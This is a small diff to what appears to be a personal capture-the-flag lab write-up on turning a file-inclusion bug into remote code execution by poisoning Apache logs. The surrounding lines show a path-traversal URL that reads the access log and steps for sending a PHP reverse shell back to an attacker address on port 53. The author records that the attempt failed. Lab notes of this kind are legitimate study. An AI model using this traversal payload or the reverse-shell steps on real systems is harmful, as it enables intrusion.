@@ -162,7 +162,7 @@ rce via logs
 `view-source:http://10.10.74.214/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log`
 
 1. create reverse shell, `shellclip --lhost 10.2.14.14 --lport 53 -c php; vim upload.php`
-2. take single quotes out, grep -n "'" upload.php
+2. take single quotes out, `grep -n "'" upload.php`
 3. run curl with the contents as parameter
 
 That did not work and the machine expired, taking a break
